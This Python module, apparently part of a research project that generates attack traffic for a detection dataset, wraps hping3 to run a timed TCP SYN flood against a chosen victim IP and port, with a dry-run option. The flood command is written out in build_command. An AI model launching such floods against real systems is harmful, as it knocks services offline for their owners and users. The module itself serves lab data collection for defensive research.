"""SYN flood / DoS attack (Table 5.4). Wraps hping3 (TCP SYN flood)."""

from pathlib import Path

from training.selfcollected.attacks.common.runner import (
    AttackRecord, check_tools, run_attack, run_timed_subprocess,
)


def build_command(victim_ip: str, port: int) -> list[str]:
    return ["hping3", "-S", "--flood", "-V", "-p", str(port), victim_ip]


def parse_extra_args(extra: list[str]) -> dict:
    parsed = {"port": 80, "duration": 30}
    it = iter(extra)
    for arg in it:
        if arg == "--port":
            parsed["port"] = int(next(it))
        elif arg == "--duration":
            parsed["duration"] = float(next(it))
    return parsed


def run(
    victim_ip: str,
    attacker_ip: str,
    out_dir: Path,
    port: int = 80,
    duration: float = 30,
    dry_run: bool = False,
) -> AttackRecord:
    params = {"port": port, "duration": duration}

    def body():
        check_tools(["hping3"])
        run_timed_subprocess(build_command(victim_ip, port), duration)

    return run_attack("syn_flood", "hping3", attacker_ip, victim_ip, out_dir, params, body, dry_run)
